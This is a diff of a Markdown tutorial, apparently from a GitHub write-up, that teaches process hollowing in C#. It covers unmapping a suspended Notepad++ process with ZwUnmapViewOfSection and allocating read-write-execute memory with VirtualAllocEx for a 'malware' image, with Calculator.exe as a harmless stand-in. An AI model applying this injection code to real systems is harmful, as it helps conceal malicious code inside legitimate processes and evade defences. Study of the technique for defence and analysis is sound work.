@@ -423,15 +423,41 @@ We have already retrieved the `ImageBase` previously. We will be hollowing out t
 
 ```cs
 if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
- {
-     Console.WriteLine("Failed to unmap section...");
-     return;
- }
+{
+    Console.WriteLine("Failed to unmap section...");
+    return;
+}
 ```
 
 # Allocating Space for Our Malware Image
 
-In order to make it easier for us to map the malware image, in our case, 'Calculator.exe', we are going rebase the memory in terms of its own `ImageBase` and `Size`.
+In order to make it easier for us to map the malware image, in our case, 'Calculator.exe', we are going allocate space to rebase the memory in terms of its own `ImageBase` and `Size`.
+
+We are going to use the `VirtualAllocEx` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex).
+
+```cpp
+LPVOID VirtualAllocEx(
+  HANDLE hProcess,
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+```
+
+## VirtualAllocEx Parameters
+
+### hProcess
+
+The handle to the process.
+
+We have already obtained the handle to the process previously.
+
+### lpAddress
+
+The pointer that specifies a desired starting address for the region of pages that you want to allocate.
+
+We want to start allocating from the `ImageBase` of the malware address so that everything fits perfectly.
 
 So now we need to find its `ImageBase` and `Size` by looking into the internals of the PE File.
 
@@ -461,66 +487,38 @@ Hence to get the `ImageBase`,
 long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
 ```
 
-Now that we have the `processHandle` and `imagebase` address, we can now call the `ZwUnmapViewOfSection` function to unmap our victim process from memory.
+
+### dwSize
+
+The size of the region of memory to allocate, in bytes.
+
+From the image above, we can see that the `SizeOfImage` is `0x50` bytes away from the `COFF` header.
+
+Hence we can obtain the `SizeOfImage` by
 
 ```cs
-PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress);
+uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
 ```
+
+### flAllocationType
+
+The type of memory allocation.
+
+We will be using `MEM_COMMIT`, `MEM_RESERVE`.
+
+### flProtect
+
+The memory protection for the region of pages to be allocated.
+
+We will be using `PAGE_EXECUTE_READWRITE`
+
 
 ## Code Example
 
 ```cs
-static void Main(string[] args)
-{
-    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
+int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW);
+long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
+uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
+IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);
 
-    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
-    IntPtr victimeFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);
-
-    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
-    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();
-
-    Console.WriteLine("Stage 1");
-    Console.WriteLine($"Creating victim process: {notepadPath}");
-
-    bool couldNotCreateProcess = !PInvoke.CreateProcess(
-                                        lpApplicationName: null,
-                                        lpCommandLine: notepadPath,
-                                        lpProcessAttributes: IntPtr.Zero,
-                                        lpThreadAttributes: IntPtr.Zero,
-                                        bInheritHandles: false,
-                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
-                                        lpEnvironment: IntPtr.Zero,
-                                        lpCurrentDirectory: null,
-                                        lpStartupInfo: startupInfo,
-                                        lpProcessInformation: processInformation
-                                    );
-    if (couldNotCreateProcess)
-    {
-        Console.WriteLine("Failed to create victim process...");
-
-    }
-
-    Console.WriteLine($"Successfully created victim process...");
-
-
-    Console.WriteLine("Stage 2");
-    Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
-    Console.WriteLine($"Getting handle to process...");
-    IntPtr processHandle = processInformation.hProcess;
-    Console.WriteLine($"Found E_LFANEW OFFSet: {e_lfanew}...");
-    Console.WriteLine($"Getting imageBasedAddress...");
-    IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
-    Console.WriteLine("Beginning Process Hollowing...");
-
-    if(PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
-    {
-        Console.WriteLine("Failed to unmap section...");
-        return;
-    }
-
-    Console.WriteLine("Successfully unmapped victim process.");
-}
 ```
-
-![image](https://user-images.githubusercontent.com/12537739/121773946-dfd72180-cbb1-11eb-9338-3ca73ea97228.png)
